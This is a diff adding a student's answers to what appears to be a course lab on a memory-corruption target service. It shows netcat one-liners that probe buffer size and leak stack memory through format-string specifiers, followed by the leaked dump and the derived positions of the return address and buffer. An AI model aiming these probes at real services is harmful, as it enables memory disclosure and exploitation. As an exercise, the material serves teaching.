@@ -1,0 +1,58 @@
+[a]
+
+Used the following command, increasing the output length until something odd occurred (gets will add another \0 character at the end).
+python -c "print('A' * 104)" | nc hackme.cs.ru.nl 2266
+
+As 104 is the first length something odd happens, and 103 is still fine, the buffer size is likely 104.
+
+[b]
+
+Used command:
+python -c "print('%lx ' * 25 + '%lx')" | nc hackme.cs.ru.nl 2266
+
+Resulting memory dump:
+7ffff7ff8067 7ffff7dd8de0 fbad2088 786c2520786c2520 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 786c2520786c25 7fffffffeb40 7fffffffebd0 4006a9 0 100400530 7fffffffebe0 4006c2 0
+ffffffff 7ffff7dd8de0 7ffff7b21970 7ffff7dd8de0 7ffff7ff2700 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 786c2520786c25 0 7fffffffebd0 4006a9 0 100400530 7fffffffebe0 4006c2 0
+
+1  = ffffffff
+2  = 7ffff7dd8de0
+3  = 7ffff7b21970
+4  = 7ffff7dd8de0
+5  = 7ffff7ff2700
+6  = 20786c2520786c25
+7  = 20786c2520786c25
+8  = 20786c2520786c25
+9  = 20786c2520786c25
+10 = 20786c2520786c25
+11 = 20786c2520786c25
+12 = 20786c2520786c25
+13 = 20786c2520786c25
+14 = 20786c2520786c25
+15 = 20786c2520786c25
+16 = 20786c2520786c25
+17 = 20786c2520786c25
+18 = 786c2520786c25
+19 = 0
+20 = 7fffffffebd0
+21 = 4006a9
+22 = 0
+23 = 100400530
+24 = 7fffffffebe0
+25 = 4006c2
+26 = 0
+
+Also used numbered arguments, eg:
+echo -e '%21$lx' | nc hackme.cs.ru.nl 2266
+
+Above command would print '4006a9'
+
+[c]
+
+Buffer starts at the 6th qword, and ends at the 18th qword.
+Saved frame pointer in the 20th qword (0x7fffffffebd0).
+Return address in the 21st qword (0x4006a9).
+
+[d]
+
+Since it looks like the 24th and 25th qwords form another saved frame pointer / return address pair, the 20th qword likely points to the 24th qword.
+This would mean the buffer starts at address 0x7fffffffebd0 - (24-6) * 8 = 0x7fffffffeb40
